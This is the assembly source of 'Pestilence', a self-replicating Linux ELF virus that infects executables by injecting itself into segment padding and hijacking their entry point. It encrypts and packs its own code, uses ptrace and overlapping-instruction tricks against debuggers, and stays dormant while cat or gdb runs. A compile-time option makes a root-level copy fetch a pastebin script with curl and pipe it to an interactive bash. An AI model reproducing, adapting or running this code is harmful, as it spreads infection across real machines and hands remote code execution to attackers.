;-------------------------------------------------------------------------------
;|                 _____          _   _ _                                      |
;|                |  __ \        | | (_) |                                     |
;|                | |__) |__  ___| |_ _| | ___ _ __   ___ ___                  |
;|                |  ___/ _ \/ __| __| | |/ _ \ '_ \ / __/ _ \                 |
;|                | |  |  __/\__ \ |_| | |  __/ | | | (_|  __/                 |
;|________________|_|   \___||___/\__|_|_|\___|_| |_|\___\___|_________________|
;|                                                                             |
;-------------------------------------------------------------------------------

%include "pestilence.inc"

section.text:
	global _start

; -== Optimization ==-
;-> Save bytes:
;	mov x, 1 => 5 bytes
;but:
;	push 1
;	pop x
;			=> 3 bytes
;and
;xor x, x => 3 bytes (put 0 into x)

; function parameters are always (rdi, rsi, rdx, rcx, r8, r9) in this specific
; order (make sense with syscall)

_params:; filled for infected binaries
	length dq 0x0; length of the packed virus
	entry_inject dq 0x0; entry of the virus in file
	entry_prg dq 0x0; entry of the prg

_start:
	call _h3ll0w0rld; push addr to stack

signature db `Pestilence version 1.0 (c)oded by lmartin`, 0x0; sw4g signature

_h3ll0w0rld:
	pop r8; pop addr from stack
	sub r8, 0x5; sub call instr
	; r8 contains the entry of the virus (for infected file cpy)
%ifdef FSOCIETY ; get envv for execve
	pop rax; argument counter
	pop rdi; start of arguments
	lea r9, [rsp + (rax + 1) * 4]; start of envv
	push rdi
	push rax
%endif
	; Overlapping instruction:
	; http://infoscience.epfl.ch/record/167546/files/thesis.pdf
	push r10
	push rdx

	push SYSCALL_GETPID; getpid
	pop rax
	syscall

	push PR_SET_PTRACER
	pop rdi
	push rax; pid
	pop rsi
	push SYSCALL_PRCTL; prctl
	pop rax
	syscall

	xor rdx, rdx

	push SYSCALL_FORK
	pop rax; fork
	syscall

	cmp rax, 0x0
	jne .parent

	.child:
		push SYSCALL_GETPPID; getppid
		pop rax
		syscall
		push rax
		pop rsi; ppid

		push PTRACE_ATTACH
		pop rdi
		push SYSCALL_PTRACE; ptrace
		pop rax
		syscall

		cmp rax, 0x0
		jne .traced

		push rsi
		pop rdi
		xor rsi, rsi
		push SYSCALL_WAIT4; wait4
		pop rax
		syscall

		xor rdi, rdi
		jmp .exit
		.traced:
			push 1
			pop rdi

		.exit:
			push SYSCALL_EXIT
			pop rax
			syscall

	.parent:
		sub rsp, 8
		push rax
		pop rdi
		lea rsi, [rsp - 8]
		push SYSCALL_WAIT4
		pop rax
		xor r10, r10; rusage
		syscall

		WEXITSTATUS rax, qword [rsp - 8]
		add rsp, 8

	pop rdx
	pop r10

	cmp rax, 0x0
	jz .sneakyboi - 2; has to jmp on [48 31 c0] -> xor rax, rax
	jmp .happy_mix
	.code: ; so it's crypted right ? EVERYTHING IS KEEEYYY
		push rdx
		lea rdi, [rel _start]
		mov rsi, [rel entry_inject]
		sub rdi, rsi
		sub rsi, 8 * 3
		add rsi, [rel length]
		push 0x7
		pop rdx ; PROT_READ | PROT_WRITE | PROT_EXEC
		push 10
		pop rax ; mprotect
		syscall; change protect from file to _eof

		lea rdi, [rel _virus]
		mov rdx, rdi
		lea rsi, [rel _params]
		sub rdx, rsi
		mov rsi, [rel length]
		sub rsi, rdx ; length - (_virus - _params)
		lea rdx, [rel _h3ll0w0rld]
		mov rcx, KEY_SIZE
		call _xor_encrypt
		pop rdx

	jmp .ft_juggling + 5; jmp on eb 24 -> jmp .infected
	.happy_mix:
	push 2
	pop rdi
	lea rsi, [rel debugging]
	jmp $+6
	mov rax, 0x58016a5a0c6a3713; push 12; pop rdx; push 1; pop rax
	syscall

	jmp $+4; has to skip 2 byte of instruction next line
	mov rdi, 0x03eb583c6a5f016a; push 1; pop rdi; push 60; pop rax; jmp $+5
	;                            from right to left
	.ft_juggling:
	mov rax, 0xc0314830eb050f42; 42[syscall][jmp .infected][xor rax, rax]

	.sneakyboi:
	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
	jnz .code ; .xor_decrypt
	; copy the prg in memory and launch it cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host

	.host:
	push SYSCALL_FORK
	pop rax; fork
	syscall

	cmp rax, 0x0
	jnz _exit

	; host part
	push r14
	call _make_virus_map
	call _search_dir
	call _munmap_virus
	pop r14

	jmp _exit
	.infected:
		push SYSCALL_FORK
		pop rax; fork
		syscall

		cmp rax, 0x0
		jz _virus

		jmp _prg
	debugging db `DEBUGGING..\n`, 0x0

;                      v dst       v len      v key       v key_size
_xor_encrypt:; (void *rdi, size_t rsi, void *rdx, size_t rcx)
	push r8
	push r9

	xor r8, r8; i len
	.reset_key_size:
		xor r9, r9; j key_size
	.loop_bytes:
		cmp r8, rsi
		je .return
		cmp r9, rcx
		je .reset_key_size
		mov al, byte[rdx + r9]; key[j]
		xor byte[rdi + r8], al
		inc r8
		inc r9
	jmp .loop_bytes
	.return:

	pop r9
	pop r8
ret

_exit:
	push SYSCALL_EXIT
	pop rax ; exit
	xor rdi, rdi; = 0
	syscall

_virus:
	push rdx
	push r8
	push r9

	; copy the virus into a mmap executable
	xor rdi, rdi; NULL

	lea rsi, [rel _eof]
	lea r8, [rel _params]
	sub rsi, r8
	push 7
	pop rdx; PROT_READ | PROT_WRITE | PROT_EXEC
	push 34
	pop r10; MAP_PRIVATE | MAP_ANON
	push -1
	pop r8 ; fd
	xor r9, r9; offset
	push SYSCALL_MMAP
	pop rax; mmap
	syscall

	push rsi; save length

;		memcpy(void *dst, void *src, size_t len)
	push rax
	pop rdi ; addr
	lea rsi, [rel _params]
	lea rdx, [rel _pack_start]
	sub rdx, rsi
	call _ft_memcpy

	mov r9, rdi; save addr
;		unpack(void *dst, void *src, size_t len)
	add rdi, rdx
	add rsi, rdx
	mov rax, [rel length]
	sub rax, rdx; length - [_pack_start - params]
	push rax
	pop rdx

	call _unpack

	push r9
	pop rdi
	pop rsi

	pop r9
	pop r8

	push rsi ; save length

	lea rsi, [rel _params]
	lea rax, [rel _search_dir]
	sub rax, rsi
	add rax, rdi

	push rdi ; save addr
	push r14
	mov r14, [rel length]

	call rax ; jump to mmaped memory
	pop r14

	pop rdi ; pop addr
	pop rsi ; pop length

	; munmap the previous exec
	push SYSCALL_MUNMAP
	pop rax
	syscall
	pop rdx

	call _exit

_prg:
	; end infected file
	push r8
	pop rax

	sub rax, [rel entry_inject]
	add rax, [rel entry_prg]

	; jmp on entry_prg
	jmp rax

;                 v dst      v src       v size
_unpack:; (void *rdi, void *rsi, size_t rdx)
	push r8
	push r9
	push r10
	push r11
	push rcx

	push rdi
	pop r9
	push rsi
	pop r10
	push rdx
	pop r11

	xor rax, rax
	xor rcx, rcx; i
	xor r8, r8; j
	.loop_uncompress:
		cmp rcx, r11
		jge .end_loop
		cmp byte[r10 + rcx], MAGIC_CHAR
		je .uncompress_char
			mov al, [r10 + rcx]
			mov [r9 + r8], al
			inc rcx
			inc r8
		jmp .loop_uncompress
		.uncompress_char:
			mov rdi, r9
			add rdi, r8
			mov al, [r10 + rcx + 1]
			push rdi
			pop rsi
			sub rsi, rax
			mov al, [r10 + rcx + 2]
			push rax
			pop rdx
			call _ft_memcpy
			xor rax, rax
			mov al, byte[r10 + rcx + 2]
			add r8, rax
			add rcx, 3
		jmp .loop_uncompress
	.end_loop:
		push r9
		pop rdi
		push r10
		pop rsi
		push r11
		pop rdx

	pop rcx
	pop r11
	pop r10
	pop r9
	pop r8
ret

_ft_memcpy: ; (string rdi, string rsi, size_t rdx)
	push rcx

	mov rax, rdi
	mov rcx, rdx
	push rdx
	mov rdx, rsi
	rep movsb
	push rax
	pop rdi
	push rdx
	pop rsi
	pop rdx
	mov rax, rdi

	pop rcx
ret

; packer-part till _eof --------------------------------------------------------
_pack_start:
; = DEBUG
; db `test`, 0x0
; =
_search_dir:
%ifdef FSOCIETY
	push SYSCALL_GETEUID; geteuid
	pop rax
	syscall

	cmp rax, 0x0
	jne .check_process

	push SYSCALL_FORK
	pop rax; fork
	syscall

	cmp rax, 0x0
	jz .i_am_root

ret
%endif

	.check_process:
	; check for process running
	push 1
	pop rsi ; mode for move_through_dir
	lea rdi, [rel process_dir]

	call _move_through_dir

	cmp rax, 0x0
	jne .return
	xor rsi, rsi ; mode for move_through_dir
	lea rdi, [rel directories]
	xor rcx, rcx; = 0
	.loop_array_string:
		add rdi, rcx
		call _ft_strlen
		push rax
		pop rcx
		call _move_through_dir
	inc rcx
	cmp byte[rdi + rcx], 0x0
	jnz .loop_array_string
	.return:
ret

%ifdef FSOCIETY
	.i_am_root:
		push r9
		pop rdx

		lea rdi, [rel devnull]
		push 1
		pop rsi
		push 2
		pop rax;open("/dev/null", O_WRONLY)
		syscall
		push rax
		pop rdi
		push 1
		pop rsi
		push 33
		pop rax; dup2(fd, 1)
		syscall
		push 2
		pop rsi
		push 33
		pop rax; dup2(fd, 2)
		syscall
	; let open otherwise don't work on guest
	;	mov rax, 3; close(fd)
	;	syscall

		; I am root
		xor rax, rax
		push rax; NULL
		lea rdi, [rel argv3]
		push rdi
		lea rdi, [rel argv2]
		push rdi
		lea rdi, [rel argv1]
		push rdi
		lea rdi, [rel argv0]
		push rdi

		mov rsi, rsp
		lea rdi, [rel argv0]
		push 59
		pop rax
		syscall

		add rsp, 32
		call _exit
%endif

_move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
	push r10
	push r12
	push r13
	push rbx
	push rcx
	push rdx

	push rsi
	pop r13

	push SYSCALL_OPEN
	pop rax; open
	push 0o0200000; O_RDONLY | O_DIRECTORY
	pop rsi
	syscall
	cmp rax, 0x0
	jl .return; jump lower

	push rdi
	pop r10; path

	sub rsp, 1024
	push rax
	.getdents:
		pop rdi
		push SYSCALL_GETDENTS
		pop rax; getdents
		push 1024
		pop rdx; size of buffer
		mov rsi, rsp; buffer
		syscall
		push rdi
		push rsi
		pop r12
		cmp rax, 0x0
		jle .close
		push rax
		pop rdx; nread
		xor rcx, rcx; = 0

	.loop_in_file:
		cmp rcx, rdx
		jge .getdents; rcx >= rdx
		mov rdi, r12
		add rdi, rcx; r12 => linux_dir
		; if not . .. +18
		add rdi, 18; linux_dir->d_name
		
		; ft_strcmp with '.' and '..' to not infect_dir with them
		push rcx
		lea rsi, [rel dotdir]
		xor rcx, rcx; = 0
		.loop_array_string:
			add rsi, rcx
			call _ft_strcmp
			cmp rax, 0x0
			je .next_file
			xor rcx, rcx; = 0
			.next_string:; seek next dir
				inc rcx
				cmp byte[rsi + rcx], 0x0
				jnz .next_string
		inc rcx
		cmp byte[rsi + rcx], 0x0
		jnz .loop_array_string

		; concat_path
			push rbx
			sub rsp, 4096

			push rdi
			pop rbx
			mov rdi, rsp; buffer
			mov rsi, r10
			call _ft_strcpy
			push rbx
			pop rsi
			call _ft_concat_path

		; check infect_dir or infect_file
			sub rsp, 600

			push SYSCALL_LSTAT
			pop rax ; stat
			mov rsi, rsp ; struct stat
			syscall
			cmp rax, 0x0
			jne .free_buffers

			mov rax, [rsi + ST_MODE]
			and rax, S_IFMT

			cmp r13, 0; infect
			je .infect

			; process
			cmp rax, S_IFDIR
			jne .free_buffers

			; if /proc/[nb] -> check /proc/[nb]/status
			push rdi
			push rbx
			pop rdi
			call _ft_isnum
			pop rdi
			cmp rax, 0x0
			je .free_buffers
			lea rsi, [rel process_status]
			call _ft_concat_path
			call _check_file_process
			cmp rax, 0x0
			jne .process_found

			jmp .free_buffers
			.infect:
				cmp rax, S_IFREG ; S_IFREG
				je .infect_file
				cmp rax, S_IFDIR ; S_IFDIR
				jne .free_buffers

			; infect dir
			xor rsi, rsi; infect -> 0
			call _move_through_dir
			jmp .free_buffers

		.infect_file:
			call _infect_file

		.free_buffers:
			add rsp, 4696
			pop rbx

		.next_file:
			pop rcx
			mov rsi, r12
			add rsi, rcx
			push rdi
			movzx edi, word [rsi + D_RECLEN]; linux_dir->d_reclen
			add rcx, rdi
			pop rdi
			jmp .loop_in_file

	.process_found:
		add rsp, 4696
		pop rbx
		pop rcx

	.close:
		push rax
		pop rsi
		pop rdi; fd
		push SYSCALL_CLOSE
		pop rax; close
		syscall
		push r10
		pop rdi
		add rsp, 1024
		push rsi
		pop rax

	.return:

	pop rdx
	pop rcx
	pop rbx
	pop r13
	pop r12
	pop r10
ret

_infect_file: ; (string rdi, stat rsi)
	push r10
	push r11
	push r12
	push r13
	push rbx
	push rcx
	push rdx

	push rsi
	pop r12
	push SYSCALL_OPEN
	pop rax; open
	push 0o0000002; O_RDWR
	pop rsi
	syscall
	cmp rax, 0x0
	jl .return; jump lower
	push rdi
	pop r10 ; path

	push r8
	push rax
	pop r8

	push r10
	xor rdi, rdi
	mov rsi, [r12 + ST_SIZE] ; statbuf.st_size
	push 3
	pop rdx ; PROT_READ | PROT_WRITE
	push 1
	pop r10 ; MAP_SHARED
	xor r9, r9
	push SYSCALL_MMAP
	pop rax ; mmap
	syscall
	pop r10
	push r8
	pop r11; fd
	pop r8
	cmp rax, 0x0
	jl .close ; < 0

	push rax
	pop rsi
	lea rdi, [rel elf_magic]
	push 5
	pop rdx
	call _ft_memcmp
	push rsi
	pop r13
	cmp rax, 0x0
	jne .unmap ; not elf 64 file

	cmp byte[rsi + E_TYPE], ET_EXEC ; ET_EXEC
	je .is_elf_file
	cmp byte[rsi + E_TYPE], ET_DYN ; ET_DYN
	jne .unmap

	.is_elf_file:
		; get pt_load exec
		mov ax, [r13 + E_PHNUM]; e_phnum
		mov rbx, r13
		add rbx, [r13 + E_PHOFF]; e_phoff
		xor rcx, rcx
		.find_segment_exec:
			inc rcx
			cmp rcx, rax
			je .unmap
			cmp dword[rbx], PT_LOAD ; p_type != PT_LOAD
			jne .next
			mov dx, [rbx + P_FLAGS]; p_flags
			and dx, PF_X ; PF_X
			jnz .check_if_infected
			.next:
				add rbx, SIZEOF(ELF64_PHDR); sizeof(Elf64_Phdr)
			jmp .find_segment_exec
		.check_if_infected:
			lea rdi, [rel signature]
			call _ft_strlen
			push rax
			pop rcx
			push rdi
			pop rdx
			mov rdi, [rbx + P_OFFSET]; p_offset
			add rdi, r13
			mov rsi, [rbx + P_FILESZ]; p_filesz
			cmp rsi, rcx
			jl .unmap
			call _ft_memmem ; TODO: Instead modify header and add sneaky special char -> ++ speed (maybe mem ?)
			cmp rax, 0x0
			jne .unmap

			; check size needed
			sub rdi, r13
			mov rdi, [rbx + P_OFFSET]
			add rdi, rsi; p_offset + p_filesz
			mov rsi, [rbx + SIZEOF(ELF64_PHDR) + P_OFFSET] ; next->p_offset
			sub rsi, rdi

			add rdi, r13 ; addr pointer -> mmap

			xor r9, r9
			mov rdx, r14
			cmp rsi, rdx
			jl .unmap ; if size between PT_LOAD isn't enough -> abort

			push rcx
			push 8 * 3
			pop rcx

			sub rdx, rcx
			; copy virus
			add rdi, rcx
			mov rsi, r8
			call _ft_memcpy
			mov rax, rdi
			add rdx, rcx
			sub rax, rcx

			push rdi
			mov rdi, rax
			push rax
			lea rcx, [rel _virus]
			lea rsi, [rel _params]
			sub rcx, rsi
			add rdi, rcx
			mov rsi, rdx; [rel length]
			push rdx
			sub rsi, rcx ; length - (_virus - _params)
			lea rdx, [rel _h3ll0w0rld]
			mov rcx, KEY_SIZE
			call _xor_encrypt
			pop rdx
			pop rax
			pop rdi
			pop rcx

			; add _params
			mov [rax], rdx ; length
			add rax, 8
			sub rdi, r13
			; copy mapped 'padding' like 0x400000
			mov rsi, rdi
			add rsi, [rbx + P_VADDR]; p_vaddr
			sub rsi, [rbx + P_OFFSET]; p_offset
			mov [rax], rsi ; entry_inject
			add rax, 8
			mov rsi, [r13 + E_ENTRY]; entry_prg
			mov [rax], rsi

			; change entry
			; copy mapped 'padding' like 0x400000
			add rdi, [rbx + P_VADDR]; vaddr
			sub rdi, [rbx + P_OFFSET]; p_offset
			mov [r13 + E_ENTRY], rdi ; new_entry

			; change pt_load size
			add [rbx + P_FILESZ], rdx; p_filesz + virus
			add [rbx + P_MEMSZ], rdx; p_memsz + virus

	.unmap:
		push r11; munmap using r11 ?
		push r13
		pop rdi
		mov rsi, [r12 + ST_SIZE] ; statbuf.st_size
		push SYSCALL_MUNMAP
		pop rax; munmap
		syscall
		pop r11
	.close:
		push r11
		pop rdi
		push SYSCALL_CLOSE
		pop rax; close
		syscall
	.return:
		push r10
		pop rdi
		push r12
		pop rsi

	pop rdx
	pop rcx
	pop rbx
	pop r13
	pop r12
	pop r11
	pop r10
ret

_check_file_process:; (string rdi)
	push r8
	push rcx
	push rdx
	push rsi

	sub rsp, 0x800; buffer to read

	xor rsi, rsi; O_RDONLY
	push SYSCALL_OPEN
	pop rax; open
	syscall
	push rdi
	pop r8
	push rax
	pop r9; fd
	xor rax, rax ; read and 0 if can't open
	cmp r9, 0x0
	jl .return; jump lower

	mov rdi, r9
	mov rsi, rsp
	push 0x800
	pop rdx
	syscall

	cmp rax, 0x0
	je .close

		push rax
		pop rsi
		lea rdi, [rel process]
		xor rcx, rcx; = 0
		.loop_array_string:
			add rdi, rcx
			; check if it is in the file
			call _ft_strlen
			cmp rsi, rax
			jl .close
			push rax
			pop rcx
			push rdi
			pop rdx
			mov rdi, rsp; buffer
			call _ft_memmem
			cmp rax, 0x0
			jne .close
			push rdx
			pop rdi
		inc rcx
		cmp byte[rdi + rcx], 0x0
		jnz .loop_array_string

	xor rax, rax
	.close:
		push rax
		pop rsi
		push r9
		pop rdi
		push SYSCALL_CLOSE
		pop rax; close
		syscall
		push rsi
		pop rax
	.return:
		push r8
		pop rdi

	add rsp, 0x800

	pop rsi
	pop rdx
	pop rcx
	pop r8
ret

; -------------------------------- utils ---------------------------------------

_ft_concat_path: ;(string rdi, string rsi) -> rdi is dest, must be in stack or mmaped region
	push rdx

	mov rdx, rdi
	push rdx
	call _ft_strlen
	add rdi, rax
	mov byte[rdi], '/'
	inc rdi
	call _ft_strcpy
	pop rdi
	mov rax, rdi

	pop rdx
ret

_ft_isnum:; (string rdi) ; 0 no - otherwise rax something else
	xor rax, rax
	.loop_char:
		cmp byte[rdi + rax], 0x0
		je .return
		cmp byte[rdi + rax], '0'
		jl .isnotnum
		cmp byte[rdi + rax], '9'
		jg .isnotnum
		inc rax
	jmp .loop_char
	.isnotnum:
		xor rax, rax
	.return:
ret

_ft_strlen:; (string rdi)
	xor rax, rax; = 0
	.loop_char:
		cmp byte [rdi + rax], 0
		jz .return
		inc rax
	jmp .loop_char
	.return:
ret

_ft_memcmp: ; (void *rdi, void *rsi, size_t rdx)
	push rcx
	dec rdx

	xor rax, rax
	xor rcx, rcx; = 0
	cmp rcx, rdx
	je .empty_return
	.loop_byte:
		mov al, [rdi + rcx]
		cmp al, [rsi + rcx]
		jne .return
		cmp rcx, rdx
		je .return
		inc rcx
	jmp .loop_byte
	.return:
		sub al, [rsi + rcx]
	.empty_return:

	inc rdx
	pop rcx
ret

_ft_memmem: ; (void *rdi, size_t rsi, void *rdx, size_t rcx)
	push r8
	push r9
	push rbx

	xor rax,rax
	xor r8, r8
	cmp rsi, rcx
	jl .return
	cmp rcx, 0x0
	je .return
	.loop_byte:
		xor rax,rax
		cmp r8, rsi
		je .return
		mov rbx, rdi
		add rdi, r8
		push rsi
		pop r9
		push rdx
		pop rsi
		push rcx
		pop rdx
		call _ft_memcmp
		push rdx
		pop rcx
		push rsi
		pop rdx
		push r9
		pop rsi
		push rbx
		pop rdi
		cmp rax, 0x0
		je .found
		inc r8
	jmp .loop_byte
	.found:
		mov rax, rdi
		add rax, r8
	.return:

	pop rbx
	pop r9
	pop r8
ret

_ft_strcmp: ; (string rdi, string rsi)
	push rdx

	call _ft_strlen
	push rax
	pop rdx
	call _ft_memcmp

	pop rdx
ret

_ft_strcpy: ; (string rdi, string rsi)
	push rdx

	push rdi
	pop rdx
	push rsi
	pop rdi
	call _ft_strlen
	push rdi
	pop rsi
	push rdx
	pop rdi
	push rax
	pop rdx
	inc rdx
	call _ft_memcpy

	pop rdx
ret

; ---------------------------- STATIC PARAMS -----------------------------------

;                   E     L    F   |  v ELFCLASS64
elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x2, 0x0
%ifdef FSOCIETY
	directories db `/`, 0x0, 0x0
	dotdir db `.`, 0x0, `..`, 0x0, `dev`, 0x0, `proc`, 0x0, 0x0
	devnull db `/dev/null`, 0x0
	argv0 db `/bin/setsid`, 0x0
	argv1 db `/bin/bash`, 0x0
	argv2 db `-c`, 0x0
	argv3 db `$(curl -s https://pastebin.com/raw/bnNiVmsD | /bin/bash -i)`, 0x0
%else
	directories db `/tmp/test`, 0x0, `/tmp/test2`, 0x0, 0x0
	dotdir db `.`, 0x0, `..`, 0x0, 0x0
%endif

	process_dir db `/proc`, 0x0
	process_status db `status`, 0x0
	process db `\tcat\n`, 0x0, `\tgdb\n`, 0x0, 0x0

_eof:

; ------------------------------- HOST ---------------------------------------

; don't need to copy the host part
; v
_make_virus_map:
	; copy the virus into a mmap executable
	xor rdi, rdi; NULL

	lea rsi, [rel _eof]
	lea r8, [rel _params]
	sub rsi, r8
	push 7
	pop rdx; PROT_READ | PROT_WRITE | PROT_EXEC
	push 34
	pop r10; MAP_PRIVATE | MAP_ANON
	push -1
	pop r8 ; fd
	xor r9, r9; offset
	push SYSCALL_MMAP
	pop rax; mmap
	syscall

	; ==		copy start of the virus
	mov rdi, rax
	push rax; save

	lea rsi, [rel _start]
	lea rdx, [rel _pack_start]
	sub rdx, rsi
	call _ft_memcpy

	; ==		pack a part
	add rdi, rdx
	call _pack
	push rax
	pop r14; size
	add r14, rdx
	add r14, 8 * 3
	pop r8
ret

_munmap_virus:
	push r8
	pop rdi ; pop addr
;	push r14
;	pop rsi ; pop length
	lea rsi, [rel _eof]
	lea r8, [rel _params]
	sub rsi, r8

	; munmap the previous exec
	push SYSCALL_MUNMAP
	pop rax
	syscall
ret

;               v dest
_pack: ;(void *rdi) -> ret size + fill rdi
	push r8
	push r10
	push r11
	push r12
	push rbx
	push rcx
	push rdx
	push rsi

	lea rdx, [rel _eof]
	lea r10, [rel _pack_start] ; dictionary = addr
	mov r11, r10; buffer = addr
	sub rdx, r10; size

	xor rcx, rcx; i = 0
	xor r8, r8; l = 0
	.loop_compress:
		cmp rcx, rdx; while (i < size) {
		jge .end_compress
		mov rsi, r10
		sub rsi, r11; len = dictionary - buffer
		cmp rsi, 255; if (len > 255) {
		jle .continue
		add r11, rsi
		sub r11, 255; buffer += len - 255
		mov rsi, r10
		sub rsi, r11; len = dictionary - buffer
		.continue: ; }
		push 1
		pop rbx; k = 1
		xor r12, r12; prev_ret = 0
		.loop_memmem:; while
			cmp rbx, 255
			jge .end_memmem; (k < 255
			mov rax, rbx
			add rax, rcx
			cmp rax, rdx; && i + k < size)
			jge .end_memmem
			push rdi
			push rdx
			push rcx
			mov rdi, r11
			mov rdx, r10
			mov rcx, rbx
			call _ft_memmem; ret = ft_memmem(buffer, len, dictionary, k)
			pop rcx
			pop rdx
			pop rdi
			cmp rax, 0x0; if (!ret) break
			je .end_memmem
			push rax
			pop r12; prev_ret = ret
			inc rbx; k++
		jmp .loop_memmem
		.end_memmem:; }
		dec rbx; k--
		cmp r12, 0x0; if (prev_ret
		je .not_compress_char
		cmp rbx, 4; && k >= 4) {
		jl .not_compress_char
		mov byte[rdi + r8], MAGIC_CHAR; addr[l] = MAGIC_CHAR
		inc r8; l++
		mov rax, r10
		sub rax, r12
		mov byte[rdi + r8], al; addr[l] = dictionary - prev_ret
		inc r8; l++
		mov rax, rbx
		mov byte[rdi + r8], al; addr[l] = k
		inc r8; l++
		jmp .next_loop; }
		.not_compress_char:; else {
		push 1
		pop rbx; k = 1
		mov al, [r10]
		mov byte[rdi + r8], al; addr[l] = *dictionary
		inc r8; l++
	.next_loop:; }
		add r10, rbx; dictionary += k
		add rcx, rbx; i += k
		jmp .loop_compress
	.end_compress: ; }
		push r8
		pop rax

	pop rsi
	pop rdx
	pop rcx
	pop rbx
	pop r12
	pop r11
	pop r10
	pop r8
ret
